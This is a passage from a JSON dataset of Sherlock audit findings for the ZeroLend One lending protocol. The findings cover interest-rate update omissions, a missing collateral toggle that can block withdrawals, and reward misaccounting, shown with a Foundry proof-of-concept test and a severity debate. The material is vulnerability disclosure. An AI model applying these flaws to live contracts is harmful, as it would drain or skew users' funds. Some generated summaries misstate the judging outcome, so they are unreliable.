test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[FAIL. Reason: assertion failed: 99999783033155331339 != 99999784100498438999] testLiquidationSimple1() (gas: 1610672)\n```\n\n5. Other points are stated in issue 387\n\n\n**0xSpearmint**\n\nThis issue is low severity. It does not satisfy the criteria for medium.\n\nAs shown by the POC, the difference in shares is 0.00000106% which is not large enough (0.01%) to be medium severity.\n\n\n\n**cvetanovv**\n\nI agree with @0xSpearmint. This issue does not meet the criteria for Medium severity:\n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nI'm planning to invalidate the issue.\n\n**Tomiwasa0**\n\n@cvetanovv  , \n\n---\nTo get the full impact of this kindly apply the appropriate fix to the bugs discovered in the liquidation function issue 473 and others, this creates a scenario also almost similar to issue 199 attacker get free  funds, \n\n\nIn evaluating the current system's functionality, issue 91 identified seven significant impacts resulting from improper handling, specifically regarding the liquidity and collateral management mechanisms:\n\n1. **Incorrect Withdrawals**: The amount withdrawn is consistently 1% of the liquidated amount, which deviates from expected behavior.\n  \n2. **Test Validity**: The test scenario I provided demonstrates the validity of the concern, although I was unable to use an appropriate timeframe due to the Chainlink timestamp check. To ensure accuracy, I strongly recommend both parties rerun the scenario with the following conditions:\n   - Funds are borrowed and remain unpaid after 3 to 6 months.\n   - The collateral value drops, and the user is subsequently liquidated.\n\n3. **Systematic Impact**: As stated in issue 91, testing across all relevant functions reveals that this has a distinct impact on subsequent function calls, altering the expected outputs.\n\n4. **Minting of Free Shares**: By not considering other influencing factors, the current setup inadvertently allows users to mint free shares. These shares can then be converted back to the original amount, creating an imbalance. \n\n5. **Collateral Decline Over Time**: The decline in collateral value over time affects the Liquidity in the pool, further complicating the issue. The test case clearly illustrates how the system's behavior changes in these scenarios. creates DOS vulnerability like issue 488 and 375.\n\n6. **Use of New Inputs**: By running the system using the new inputs provided, you will see the exact impact referenced by spearmint. This highlights the need for a comprehensive review of the mechanics involved.\n\n---\n\n\n\n**cvetanovv**\n\n@Tomiwasa0 I will agree with your comment and leave this issue as is.",
      "summary": "\nThe Zerolend liquidation process has a bug where the interest rate is not updated before transferring liquidation funds to the treasury. This leads to an inflated index being used by the next user, resulting in incorrect share calculations and potential financial discrepancies. The root cause of the bug is the failure to update the interest rate before transferring funds, which is necessary to maintain the correct liquidity rate. A similar issue has been found in the withdrawal function as well. A suggested fix is to update the interest rate before transferring the funds, similar to how Aave handles it. This issue has a low severity as the difference in shares is only 0.00000106%, which does not meet the criteria for a medium severity issue. However, it is recommended to apply the appropriate fix to other bugs discovered in the liquidation function to prevent further issues and potential vulnerabilities. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/401",
      "tags": [],
      "finders": [
        "dany.armstrong90",
        "trachev",
        "almurhasan",
        "ether\\_sky",
        "A2-security",
        "nfmelendez",
        "Bigsam"
      ]
    },
    {
      "id": "41828",
      "title": "M-7: Position Risk Management Functionality Missing in Position Manager and dos in certain conditions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/398 \n\n## Found by \n0xc0ffEE, A2-security, almurhasan, tallo\n## Summary\nProtocol users who manage their positions through the  `PositionManager` are not able to manage risk of their positions, by setting collateral to on and off. Which is a core functionality of every lending protocol. The missing functionality will doss users from withdrawing also in certain conditions.\n## Vulnerability Detail\nFor each collateral resrve the pool tracks whethere the user is using as collateral or not, this is set in the userConfigMap. Any user could set which reserve he is setting as collateral by calling the \n\n```solidity\nfunction setUserUseReserveAsCollateral(address asset, uint256 index, bool useAsCollateral) external {\n    _setUserUseReserveAsCollateral(asset, index, useAsCollateral);\n  }\n```\nThe PositionManager.sol which the protocol users, are expected to interact with, doesn't implement the setUserUseReserveAsCollateral(), which first of all leads to the inablity of protocol users to manage risk on their Positions. \nThe second impact and the most severe is that Position holders will be dossed, in the protocols if the ltv of one of the reserve token being used, will be set to zero. In such an event, users are required to set the affected collateral to false in order to do operations that lowers the ltv like withdraw to function.\n\nThe doss will be done in the function `validateHFandLtv()` which will be called to check the health of a position is maintend after a withdrawal\n\n```solidity\n  function validateHFAndLtv(\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage _balances,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 => address) storage reservesList,\n    DataTypes.UserConfigurationMap memory userConfig,\n    DataTypes.ExecuteWithdrawParams memory params\n  ) internal view {\n    DataTypes.ReserveData memory reserve = reservesData[params.asset];\n\n    (, bool hasZeroLtvCollateral) = validateHealthFactor(_balances, reservesData, reservesList, userConfig, params.position, params.pool);\n\n@>>    require(!hasZeroLtvCollateral || reserve.configuration.getLtv() == 0, PoolErrorsLib.LTV_VALIDATION_FAILED);\n  }\n```\nIn this case, if the user wants to withdraw other reserves that don't have 0 tlv, the transaction will revert.\n\n\n## Impact\n- missing core functions, that NFTPositionManager users are not able to use\n- NFTPositionManager are unable to manage to risk at all\n- Withdrawal operations in NFTPositionManager will be dossed in certain conditions\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/Pool.sol#L175C1-L177C4\n## Tool used\n\nManual Review\n\n## Recommendation\nImplement the missing functionality in the `NFTPositionManager.sol`, to allow users to manage the risk on their `NFTPosition`\n\n\n\n## Discussion\n\n**0xjuaan**\n\n@nevillehuang The main impact here is that if an admin sets the ltv of a collateral to zero, then users withdrawals from the NFTPositionManager will be DoS'd. If this is valid, shouldn't #166 be valid? Since 166 was invalidated since it required admins to perform actions that lead to issues.",
      "summary": "The bug report discusses an issue with the Position Risk Management functionality in the Position Manager. This functionality is missing, which means that users are unable to manage the risk of their positions by setting collateral on and off. This is a core feature of any lending protocol. The missing functionality can also cause users to be unable to withdraw in certain conditions. The bug report provides details on how this issue can be exploited and the impact it has on users. It also includes a code snippet and a recommendation to implement the missing functionality in the NFTPositionManager. The bug was found through manual review and is currently being discussed by developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/398",
      "tags": [],
      "finders": [
        "tallo",
        "0xc0ffEE",
        "A2-security",
        "almurhasan"
      ]
    },
    {
      "id": "41827",
      "title": "M-6: The rewards distribution in the NFTPositionManager is unfair",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393 \n\n## Found by \n000000, 0xNirix, A2-security, ether\\_sky, iamnmt\n## Summary\nIn `NFTPositionManager`, users can `deposit` or `borrow` `assets` and earn `rewards` in `zero`.\nHowever, the distribution of these `rewards` is not working correctly.\n## Vulnerability Detail\nLet's consider a `pool`, `P`, and an `asset`, `A`, with a current `liquidity index` of `1.5`.\n- Two users, `U1` and `U2`, each `deposit` `100` units of `A` into `pool` `P`. (Think of `U1` and `U2` as `token IDs`.)\n- Let's define `assetHash(P, A, false)` as `H`.\n- In the `_supply` function, the `balance` is `100`, since it represents the `asset amount`, not `shares` (as seen in `line 57`).\n```solidity\nfunction _supply(AssetOperationParams memory params) internal nonReentrant {\n  pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);\n\n57:  uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);\n  _handleSupplies(address(pool), params.asset, params.tokenId, balance);\n}\n```\n- The `shares` for these users would be calculated as `100 ÷ 1.5 = 66.67 shares` each in the `P`.\n\nNow, in the `_handleSupplies` function, we compute the `total supply` and `balances` for these users for the `assetHash` `H`.\n```solidity\nfunction _handleSupplies(address pool, address asset, uint256 tokenId, uint256 balance) internal {\n  bytes32 _assetHash = assetHash(pool, asset, false);  // H\n  uint256 _currentBalance = _balances[tokenId][_assetHash];  // 0\n  \n  _updateReward(tokenId, _assetHash);\n  _balances[tokenId][_assetHash] = balance; // 100\n  _totalSupply[_assetHash] = _totalSupply[_assetHash] - _currentBalance + balance;\n}\n```\nThose values would be as below:\n- Total supply: `totalSupply[H] = 200`\n- Balances: `_balances[U1][H] = _balances[U2][H] = 100`\n#### After some time:\n\n- The `liquidity index` increases to `2`.\n- A new user, `U3`, `deposits` `110` units of `A` into the `pool` `P`.\n- `U2` makes a small `withdrawal` of just `1 wei` to trigger an update to their `balance`.\n\nNow, the `total supply` and user `balances` for `assetHash` `H` become:\n\n- `_balances[U1][H] = 100`\n- `_balances[U2][H] = 100 ÷ 1.5 × 2 = 133.3`\n- `_balances[U3][H] = 110`\n- `totalSupply[H] = 343.3`\n\nAt this point, User `U1`’s `asset balance` in the `pool P` is the largest, being `1 wei` more than `U2`'s and `23.3` more than `U3`'s. \nYet, `U1` receives the smallest `rewards` because their `balance` was never updated in the `NFTPositionManager`. \nIn contrast, User `U2` receives more `rewards` due to the `balance` update caused by `withdrawing` just `1 wei`.\n\n### The issue:\n\nThis system is unfair because:\n\n- User `U3`, who has fewer `assets` in the `pool` than `U1`, is receiving more `rewards`.\n- The `rewards` distribution favors users who perform frequent updates (like `deposits` o `withdrawals`), which is not equitable.\n\n### The solution:\n\nInstead of using the `asset balance` as the `rewards` basis, we should use the `shares` in the `pool`. \nHere’s how the updated values would look:\n\n- `_balances[U1][H] = 66.67`\n- `_balances[U2][H] = 66.67 - 1 wei`\n- `_balances[U3][H] = 110 ÷ 2 = 55`\n- `totalSupply[H] = 188.33`\n\nThis way, the `rewards` distribution becomes fair, as it is based on actual contributions to the `pool`.\n## Impact\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L57-L58\n## Tool used\n\nManual Review\n\n## Recommendation\n```solidity\nfunction _supply(AssetOperationParams memory params) internal nonReentrant {\n  pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);\n\n-  uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);\n+  uint256 balance = pool.getBalanceRaw(params.asset, address(this), params.tokenId).supplyShares;\n\n  _handleSupplies(address(pool), params.asset, params.tokenId, balance);\n}\n```\nThe same applies to the `_borrow`, `_withdraw`, and `_repay` functions.\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\nIs there a permisionless update functionality?\n\n**sherlock-admin4**\n\nPoC requested from @etherSky111\n\nRequests remaining: **25**\n\n**etherSky111**\n\nThanks for judging.\n\nThere is a clear issue. \nhttps://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473\nTo test this issue properly, we need to resolve the above issue first.\n```solidity\nfunction getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-  uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-  return self.supplyShares + increase;\n- \n+  return self.supplyShares.rayMul(index);\n}\n```\n\nBelow is test code.\n```solidity\nfunction supplyForUser(address user, uint256 supplyAmount, uint256 tokenId, bool mintNewToken) public {\n  uint256 mintAmount = supplyAmount;\n  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));\n  INFTPositionManager.AssetOperationParams memory params =\n    INFTPositionManager.AssetOperationParams(address(tokenA), user, supplyAmount, tokenId, data);\n\n  _mintAndApprove(user, tokenA, mintAmount, address(nftPositionManager));\n\n  vm.startPrank(user);\n  if (mintNewToken == true) {\n    nftPositionManager.mint(address(pool));\n  }\n  nftPositionManager.supply(params);\n  vm.stopPrank();\n}\n\nfunction borrowForUser(address user, uint256 borrowAmount, uint256 tokenId) public {\n  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));\n  INFTPositionManager.AssetOperationParams memory params =\n    INFTPositionManager.AssetOperationParams(address(tokenA), user, borrowAmount, tokenId, data);\n\n  vm.startPrank(user);\n  nftPositionManager.borrow(params);\n  vm.stopPrank();\n}\n\nfunction testRewardDistribution() external {\n  DataTypes.ReserveData memory reserveData_0 = pool.getReserveData(address(tokenA));\n  console2.log('initial liquidity index                => ', reserveData_0.liquidityIndex);\n\n  address U1 = address(11);\n  address U2 = address(12);\n  address U3 = address(13);\n  \n  /**\n    User U1 wants to mint a new NFT (tokenId = 1) and supply 100 ether token\n    */\n  supplyForUser(U1, 100 ether, 1, true);\n  /**\n    User U2 wants to mint a new NFT (tokenId = 2) and supply 100 ether token\n    */\n  supplyForUser(U2, 100 ether, 2, true);\n\n  bytes32 assetHash = nftPositionManager.assetHash(address(pool), address(tokenA), false);\n\n  uint256 balancesOfU1 = nftPositionManager.balanceOfByAssetHash(1, assetHash);\n  uint256 balancesOfU2 = nftPositionManager.balanceOfByAssetHash(2, assetHash);\n  console2.log('initial balance of U1 for rewards      => ', balancesOfU1);\n  console2.log('initial balance of U2 for rewards      => ', balancesOfU2);\n\n  /**\n    For testing purposes, Alice mints a new NFT (tokenId = 3), supplies 1000 ether, and borrows 600 Ether. \n    This action increases the pool's liquidity rate to a non-zero value.\n    */\n  supplyForUser(alice, 1000 ether, 3, true);\n  borrowForUser(alice, 600 ether, 3);\n\n  DataTypes.ReserveData memory reserveData_1 = pool.getReserveData(address(tokenA));\n  console2.log('current liquidity rate                 => ', reserveData_1.liquidityRate);\n\n  /**\n    Skipping 2000 days is done for testing purposes to increase the liquidity index. \n    In a real environment, the liquidity index would increase continuously over time.\n    */\n  vm.warp(block.timestamp + 2000 days);\n\n  pool.forceUpdateReserve(address(tokenA));\n  DataTypes.ReserveData memory reserveData_2 = pool.getReserveData(address(tokenA));\n  console2.log('updated liquidity index                => ', reserveData_2.liquidityIndex);\n\n  /**\n    User U2 supplies 100 wei (a dust amount) to trigger an update of the balances for rewards.\n    */\n  supplyForUser(U2, 100, 2, false);\n\n  uint256 balancesOfU1Final = nftPositionManager.balanceOfByAssetHash(1, assetHash);\n  uint256 balancesOfU2Final = nftPositionManager.balanceOfByAssetHash(2, assetHash);\n  console2.log('final balance of U1 for rewards        => ', balancesOfU1Final);\n  console2.log('final balance of U2 for rewards        => ', balancesOfU2Final);\n\n  /**\n    User U3 wants to mint a new NFT (tokenId = 4) and supply 110 ether token\n    */\n  supplyForUser(U3, 110 ether, 4, true);\n  uint256 balancesOfU3Final = nftPositionManager.balanceOfByAssetHash(4, assetHash);\n  console2.log('final balance of U3 for rewards        => ', balancesOfU3Final);\n}\n```\n\nEverything is in below log:\n```solidity\ninitial liquidity index                =>  1000000000000000000000000000\ninitial balance of U1 for rewards      =>  100000000000000000000\ninitial balance of U2 for rewards      =>  100000000000000000000\ncurrent liquidity rate                 =>  43490566037735849056603774\nupdated liquidity index                =>  1238304471439648487981390542\nfinal balance of U1 for rewards        =>  100000000000000000000\nfinal balance of U2 for rewards        =>  123830447143964848898\nfinal balance of U3 for rewards        =>  110000000000000000000\n```\n\nThere is no `reward system` that requires users to continuously update their `balances`. \nHow can users realistically update their `balances` every second to receive accurate `rewards`? \nIs this practical?\n\n**0xspearmint1**\n\nescalate\n\nThis issue does not meet Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) that requires the following:\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nFor this issue to cause a 0.01% loss there must be an unrealistic increase in the liquidityIndex in an extremely small 14 day period. The POC provided inflates the liquidity index by borrowing a 60% of the funds at a huge interest rate for 5.5 years, this is absolutely not realistic and will never happen.\n\n\n\n\n**sherlock-admin3**\n\n> escalate\n> \n> This issue does not meet Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) that requires the following:\n> >Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n> \n> For this issue to cause a 0.01% loss there must be an unrealistic increase in the liquidityIndex in an extremely small 14 day period. The POC provided inflates the liquidity index by borrowing a 60% of the funds at a huge interest rate for 5.5 years, this is absolutely not realistic and will never happen.\n> \n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**aliX40**\n\nThis issue is a high severity bug:\n- Tracking shares instead of assets is basically 101 of staking rewards contracts. \n- There is a provable and pocable significant  loss/theft of yield (more than 1%)\n- Rewards Accounting is completly false \n\n**obou07**\n\nescalate \nper [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393#issuecomment-2395124046)\n\n**sherlock-admin3**\n\n> escalate \n> per [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393#issuecomment-2395124046)\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nI think this issue can be of High severity. \n\nThe attack path described in #58 shows very well how a user can deposit 1 USDC every day and earn more rewards than a normal user. \n\nTo execute this attack, we have almost no restrictions( except the normal ones, to have a reward and interest rate above zero), and the losses exceed 1%.\n\nPlanning to accept @obou07 escalation and make this issue High.\n\n**0xSpearmint**\n\n@cvetanovv This issue has a severe constraint:\n1. The other users must not update their position at all for an extended period of time (~4 months to create a 1% difference). This is an external constraint out of the control of the attacker. Furthermore, since a reward EPOCH lasts only 2 weeks it is likely that users will redeem rewards and then compound them back into their position, this totally protects them from the issue.\n\n\n**samuraii77**\n\nThe intended design is for users to __NOT__ update their position, thus it is expected for users to not update their positions for prolonged periods of time. For that reason, the used word \"constraint\" is not quite correct, it is not a constraint, it is the expected scenario.\n\n**0xSpearmint**\n\nHigh severity states\n>Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nWhat I described is an external condition (user does not update their position at all, for an extended period of time) that looks extensive to me. All it takes is for a user to supply/withdraw from their position once in a 4 month period to make this issue have very low impact.\n\n\n**samuraii77**\n\nThat is a limitation but not an extensive one as I mentioned in my above comment - users have absolutely no reason to update their positions usually. The only reason people would update their position is due to the issue mentioned in this report which means that only a few users who have a good understanding of Solidity and a rather malicious mindset would update their positions. \n\nFurthermore, it only takes 1 user not updating his position to cause a loss of funds.\n\n**0xSpearmint**\n\nIt is ridiculous to say the only reason people will update their position is this issue. Users modify their positions for a multitude of reasons in DEFI (moving to a different pool with more yield, compounding rewards, etc).\n\n**etherSky111**\n\nAs a normal DeFi user, will you update your position continuously?\n\n**0xSpearmint**\n\nAll the user has to do is update their position once every few months.\n\n**cvetanovv**\n\n@0xSpearmint is right. Most users are short-term investors(rather than long-term) who would update their positions more frequently. The chances of someone updating their position at least once every few months are huge and do not match the High severity rule, whereby there shall be **no limitations**.\n\nMy decision is to reject both escalations and leave this issue Medium severity.\n\n**iamnmt**\n\n@cvetanovv \n\n> Most users are short-term investors(rather than long-term) who would update their positions more frequently.\n\nI think it is not fair to make that assumption. It is a subjective assumption. It is equally likely a user is a short-term investor or a long-term investor. The impact for the long-term investor satisfies the high severity requirement.\n\n**0xSpearmint**\n\nALL investors (short term/ long term) are incentivised to compound rewards back into their positions ASAP to get a greater return.\n\n**etherSky111**\n\nOf course, the final decision is up to @cvetanovv  and I don't want to argue.\nBut @0xSpearmint is thinking wrongly.\n\n\n> ALL investors (short term/ long term) are incentivised to compound rewards back into their positions ASAP to get a greater return.\n\nCould you please let me know about any other reward system where stakers should update their positions repeatedly to get a correct rewards?\nThis is obviously a bug and there is no guarantee that all investers should update their positions ASAP to get a greater return.\n\nAs a long-term inversters, how do they know whether their rewards are calculated wrongly if they didn't update their positions?\nMaybe the protocol notify to them?\n\n**0xSpearmint**\n\nI agree this is an issue. But it does not meet sherlock's strict criteria for high severity.\n\nHere is sherlock's criteria for medium:\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.\n\nThis issue requires a specific external condition, the other users must not update their position **at all for an extended period of time** (4 months).\n\n**etherSky111**\n\nThis is my last comment.\n\n\n> I agree this is an issue. But it does not meet sherlock's strict criteria for high severity.\n> \n> Here is sherlock's criteria for medium:\n> \n> > Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.\n> \n> This issue requires a specific external condition, the other users must not update their position **at all for an extended period of time** (4 months).\n\nThis is not a specific external condition.\nImagine there are 100 stakers and are you sure that all these users update their positions in 4 months?\nIf I am a long term staker and I deposited large tokens to get `ZERO` token rewards, I won't update my positions for a long period as I believe the rewards calculation is correct.\nUnfortunately, there is an error in the rewards calculation and I will lose funds accidently.\nBut I think this is at most medium issue because this is my mistake to not update my positions accordingly.\nI should've update my positions every 4 months.\n\nAnd please stop arguing and let the judge decide.\n\n\n**cvetanovv**\n\nThis is the rule for **High** severity:\n\n> Definite loss of funds **without** (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nWe only have a 1% loss if someone doesn't update their position for a few months. This is a serious limitation. To be High severity, there should be no limitation as written in the rule.\n\nBut it perfectly fits the **Medium** severity rule:\n\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nMy decision is to reject both escalations and leave this issue Medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393/#issuecomment-2393292065): rejected\n- [obou07](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393/#issuecomment-2395131426): rejected",
      "summary": "\nThe report discusses a bug in the rewards distribution system of the NFTPositionManager. The distribution of rewards is not working correctly, and it is found that users must continuously update their balances in order to receive accurate rewards. This is not practical for users to do, and there is a debate about whether this issue should be classified as medium or high severity. Some argue that the issue only causes a loss of funds if certain external conditions are met, while others argue that it can lead to a definite loss of funds without limitations. Ultimately, the decision is made to classify the issue as medium severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393",
      "tags": [],
      "finders": [
        "000000",
        "0xNirix",
        "ether\\_sky",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41826",
      "title": "M-5: After a User withdraws The interest Rate is not updated accordingly leading to the next user using an inflated index during next deposit before the rate is normalized again",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/387 \n\n## Found by \nA2-security, Bigsam, Obsidian, iamnmt\n### Summary\n\nA bug in Zerolend's withdrawal mechanism causes the interest rate to not be updated when funds are transferred to the treasury during a withdrawal. This failure leads to the next user encountering an inflated interest rate when performing subsequent actions like deposit, withdrawal or borrow before the rate is normalized again. The issue arises because the liquidity in the pool drops due to the funds being transferred to the treasury, but the system fails to update the interest rate to reflect this change.\n\n### Root Cause\n\nExamples of update rate before transferring everywhere in the protocol to maintain Rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L69-L81\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L125-L146\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L88-L99\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L139-L158\n\nThe same process can be observed in Aave v 3.\n\n1. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L130\n2. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L65\n3. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L145-L150\n4.  https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L227-L232\n\nLooking at the effect of updating rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L134-L182\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L98-L131\n\nThis rates are used to get the new index\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235-L237\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nIn the current implementation of Zerolend, during a **withdrawal**, the protocol transfers a portion of the funds to the **treasury**. However, it does not update the interest rate before this transfer has being done for all transfers, leading to an **inflated liquidity rate** being used by the next user, particularly for deposits. This is problematic as the next user deposits/withdraws at a rate that is incorrectly high, causing them to receive fewer shares than they should.\n\nIn comparison, Aave mints shares to the treasury, which can later withdraw this funds like any other user. \n\nEach withdrawal out of the contract in underlying asset **in Aave** updates the interest rate, ensuring the rates reflect the true liquidity available in the pool.\n\n Zerolend's approach of transferring funds directly upon every user withdrawal fails to adjust the interest rate properly, resulting in a temporary discrepancy that affects subsequent users.\n\n#### Code Context:\n\nIn the **`executeMintToTreasury`** function, the accrued shares for the treasury are transferred, but the interest rates are not updated to account for the change in liquidity.\n\n```solidity\nfunction executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);\n\n@audit>> no interest rate update before fund removal >>       IERC20(asset).safeTransfer(treasury, amountToMint);\n\n      totalSupply.supplyShares -= accruedToTreasuryShares;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```\n\nAs can be seen in this snippet, the funds are transferred to the treasury, but the function does not invoke any interest rate update mechanism. The liquidity in the pool decreases, but the next user's deposit will use an inflated rate due to this oversight.\n\n#### Interest Rate Update Example (Correct Flow):\n\nIn other parts of the code, such as during withdrawals, the interest rate is properly updated when liquidity changes:\n\n```solidity\n\n function executeWithdraw(\n    mapping(address => DataTypes.Res\n\n---------------------------------------\nreserve.updateInterestRates(\n  totalSupplies,\n  cache,\n  params.asset,\n  IPool(params.pool).getReserveFactor(),\n  0,  // No liquidity added\n  params.amount,  // Liquidity taken during withdrawal\n  params.position,\n  params.data.interestRateData\n);\n```\n\nThe **`updateInterestRates`** function correctly calculates the new interest rate based on the changes in liquidity, ensuring the system uses accurate rates for subsequent operations.\n\n#### Example of Problem:\n\nConsider the following scenario:\n- A user withdraws a portion of funds, which triggers the transfer of some assets to the treasury.\n- The liquidity in the pool drops, but the interest rate is not updated.\n- The next user deposits into the pool using the **inflated liquidity rate**, resulting in fewer shares being minted for them.\n\nSince the actual liquidity is lower than the interest rate assumes, the user depositing gets fewer shares than expected.\n\n---\n\n### Impact\n\n- **Incorrect Share Calculation**: Users depositing after a treasury withdrawal will receive fewer shares due to an artificially high liquidity rate than the appropriate one , leading to loss of potential value.\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nThe mitigation involves ensuring that the **interest rate** is properly updated **before** transferring funds to the treasury. The rate update should account for the liquidity being transferred out, ensuring the new rates reflect the actual available liquidity in the pool.\n\n#### Suggested Fix:\n\nIn the **`executeMintToTreasury`** function, call the **`updateInterestRates`** function **before** transferring the assets to the treasury. This will ensure that the interest rate reflects the updated liquidity in the pool before the funds are moved.\n\n##### Modified Code Example:\n\n```solidity\nfunction executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);\n\n++     // Update the interest rates before transferring to the treasury\n++      reserve.updateInterestRates(\n++        totalSupply,\n++       DataTypes.ReserveCache({}), // Supply necessary cache data\n++        asset,\n++       IPool(asset).getReserveFactor(),\n++        0, // No liquidity added\n++       amountToMint, // Liquidity taken corresponds to amount sent to treasury\n++        bytes32(0), // Position details (if any)\n++       new bytes(0) // Interest rate data (if any)\n++      );\n\n      IERC20(asset).safeTransfer(treasury, amountToMint);\n      totalSupply.supplyShares -= accruedToTreasuryShares;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```\n\nIn this updated version, the interest rates are recalculated to account for the **liquidity sent** to the treasury. This ensures that the **next user's deposit** uses a correctly updated interest rate.\n\n---\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this 